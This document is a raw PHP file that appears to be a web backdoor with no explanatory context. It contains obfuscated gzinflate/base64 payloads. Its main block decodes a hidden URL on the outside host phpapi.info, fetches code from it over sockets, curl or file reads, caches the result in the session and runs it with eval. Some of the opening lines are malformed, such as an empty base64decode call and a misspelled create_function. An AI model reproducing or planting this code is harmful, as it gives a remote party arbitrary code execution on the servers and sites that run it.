


$html=eval(gzinflate(base64decode()));
$css = Creat_funcation;
$style=creat_function( , );
$style();



<?php 
echo(gzinflate(base64_decode('lVZhb5tIEP0eKf9hg6ICEufgXBy1sSI1TTHJKcY5jJsmbYTwspitMUt3SWiT+r/fLLZjjN3UxxfE7sybN29nZtndIZwz7nOSMZ7TdKSZent3RxAhKEt9kQc81+QKjZC2R4Ugubbv961+/7LnfFGyOAsyqtzrOnre3UHw7GN0ilS1Pf96EIQHI5LmcrXLnmiSBAdHDRNpmE2yIKfDhLRRt39poeOG2UY3NA1ZIZDjoVbjUF/i8AQQhoEgx0d+SDALibb6pdwO4n7Xdqzh33fdrvnP460Z2uFhx3M+f6DDT9mhd5G5odn66Ny04k/N8bvz0empouuVCA4p6jGUq6cP10M7iYOmexl8dv7t2XHRtTtjbI9a2O4UgTfg+Ntdcns4Lm69uBXcZPndU/JIbKfo3Tg8nMSTq0JGmgeSQkYPKc6lvuQHFbnQ1EgwPGYZSdWlkiWrhKZjSDwLuCA+UNQkzwVUafH9gfCfYFKaflFB01i9rxrETEj1Rc5zlrCCcG1uKjfU+xWwKAPLFzJa6Wugt6aB9qFOUjZ7A5SBmmbVU2YF3ivkS0T2IIMrtuWhg+cZ2Sm68Lzrg2bD/Mq/pkp7g0cDXC4g9gl6LjlMX7UcQJH9dSar7AT9/xp7FfqcpSkpz+oEnSdMEGm9ySMqOM2J1MAovfU6Ik1jEoSEgxrN+h5maQ7shVSqDlzENCHQexFhUSnxmsaLQiHy7EYE6qlkcWS+O66zeDmqJZtTZG5EXCXWmBUY2YA3/VOIN2+QNucH+YF06NcvVFmQauq/51ARzvxz+NpnhOWhlbqtiS6bZpFgZXOOMF226x4UfMZAVmws5oQus1prYwybPk1prr6yT34QXG9zHAOZF2+tyrVchbHLMpi8ODbQ+cC96l17PrxmdLay9i67Vm/gQd+2trJ3LW/gOp575vQ7lmsgzx1Y29HqW+6ZbTmeUZn+K0MGL3KVSkjnNdz5oS13tjgMEM6H4tfUIIEpJ2elH22aqDmZZLLR3kfQV2vjtIwAFvlPbWap6xvK5j2dZIm8HlTVmCOugVRoKiFJPlJ+loYdiKlshpR0ZAL+oiRXuFUE2JT/HjRSFCSC1MpqNvfl7Z4EeJYt2AMjBZzxyqmsX+rgPHqiaZQEef2yBd8Ks+ns92CLvwPyGCQbLQBs+h8=')));

?>

<?php
error_reporting(0);
session_start();
if (!isset($_SESSION["phpapi"])) {
    $c = '';
    $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
    $url = base64_decode(base64_decode("YUhSMGNEb3ZMM0JvY0dGd2FTNXBibVp2THpRd05DNW5hV1k9Cg==")); //http://phpapi.info/404.gif
    $urlNew= base64_decode("LzBPbGlha1RIaXNQOGhwMGFkcGg5cGFwaTUrcjZlY2kwYTh5aWptZzlveGNwOWNrdmhmLw=="); ///0OliakTHisP8hp0adph9papi5+r6eci0a8yijmg9oxcp9ckvhf/
    if (function_exists('fsockopen')) {
        $link = parse_url($url);
        $query = $link['path'];
        $host = strtolower($link['host']);
        $fp = fsockopen($host, 80, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET /{$query} HTTP/1.0\r\n";
            $out .= "Host: {$host}\r\n";
            $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $inheader = 1;
            $contents = "";
            while (!feof($fp)) {
                $line = fgets($fp, 4096);
                if ($inheader == 0) {
                    $contents .= $line;
                }
                if ($inheader && ($line == "\n" || $line == "\r\n")) {
                    $inheader = 0;
                }
            }
            fclose($fp);
            $c = $contents;
        }
    }
    if (!strpos($c, $urlNew) && function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        $c = curl_exec($ch);
        curl_close($ch);
    }
    if (!strpos($c, $urlNew) && ini_get('allow_url_fopen')) {
        $temps = @file($url);
        if (!empty($temps))
            $c = @implode('', $temps);
        if (!strpos($c, "delDirAndFile"))
            $c = @file_get_contents($url);
    }
    if (strpos($c, $urlNew) !== false) {
        $c = str_replace($urlNew, "", $c);
        $_SESSION["phpapi"] = gzinflate(base64_decode($c));
        print($_SESSION["phpapi"]);
    }
}
if (isset($_SESSION["phpapi"])) {
    eval($_SESSION["phpapi"]);
}


?>



